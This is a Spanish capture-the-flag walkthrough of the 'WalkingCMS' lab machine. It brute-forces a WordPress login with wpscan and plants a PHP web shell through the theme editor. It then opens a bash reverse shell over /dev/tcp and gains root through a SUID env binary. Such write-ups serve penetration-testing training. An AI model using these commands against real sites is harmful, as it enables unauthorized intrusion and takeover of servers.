- Tags: #WalkingCMS
---
[Maquina WalkingCMS](https://mega.nz/file/hSF1GYpA#s7jKfPy1ZXVXpxFhyezWyo1zCUmDrp7eYjvzuNNL398) --> Intrusión por fuerza bruta en el panel interno de wordpress y acceso al servidor desde dicho panel.

```bash
7z x walkingcms.zip # Descomprimimos el archivo.
sudo bash auto_deploy.sh walkingcms.tar # Desplegamos el laboratorio
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Realizamos una traza ICMP para determinar si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Reconocimiento Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-10000 # Usamos nuestra herramienta para detectar puertos.
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos deteccion de puertos expuestos
extractPorts allPorts # Parseamos la informacion mas relevante del escaneo
nmap -sC -sV -p80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y la version detras de estos puertos
```

### Fase Enumeracion Web:
**( 80/tcp open  http    Apache httpd 2.4.57 ((Debian)) )** --> Tenemos un servicio web expuesto.

```bash
whatweb http://172.17.0.2 # Realizamos deteccion de las tecnologias empleadas por esta web
```

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash # Realizamos Fuzzing de directorios
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/] # Resultado
```

**( http://172.17.0.2/wordpress/ )** --> Realizamos fuzzing en estar url

```bash
gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash 

# Resultado
/wp-content/          (Status: 200) [Size: 0]
/wp-includes/         (Status: 200) [Size: 60643]
/wp-admin/            (Status: 302) [Size: 0] [--> http://172.17.0.2/wordpress/wp-login.php?redirect_to=http%3A%2F%2F172.17.0.2%2Fwordpress%2Fwp-admin%2F&reauth=1]
```

```bash
wpscan --url http://172.17.0.2/wordpress/ # Realizamos la enumeracion CMS
wpscan --url http://<URL> --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive # Realizamos enumeracion mas intrusiva
```

**( mario )** -> Tenemos un potencial usuario al cual aplicaremos fuerza bruta.

```bash
wpscan --url http://172.17.0.2/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames mario 

# Resultado
[!] Valid Combinations Found:
 | Username: mario, Password: love
```

### Fase Intrusion
```bash
http://172.17.0.2/wordpress/wp-login.php?redirect_to=http%3A%2F%2F172.17.0.2%2Fwordpress%2Fwp-admin%2F&reauth=1

username: mario
password: love
```

**Nota** -> Sabiendo que podemos modificar los temas para derivar a **Ejecucion Remota Comandos** modificaremos el archivo: **( index.php )** que se encuentra el el apartado: **THEME EDITOR**
```bash
<?php system($_GET["cmd"]);?> # Realizaremos una llamada a nivel de sistema y la controlaremos con el parametro ( cmd )
```

```bash
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=whoami # Apuntamos al recurso que previamente habiamos modificado
```

**Ejecucion Remota De Comandos**

### Ganando Acceso Al Sistema:
```bash
172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/$IP/$PORT <%261'
```

### Fase Escalada Privilegios:
```bash
find / -perm -4000 2>/dev/null

/usr/bin/env # Binario potencial para elevar privilegios.
```

Ejecutamos el binario para escalar al usuario privilegiado **root**
```bash
/usr/bin/env /bin/bash -p
```

```bash
bash-5.2# whoami
root
```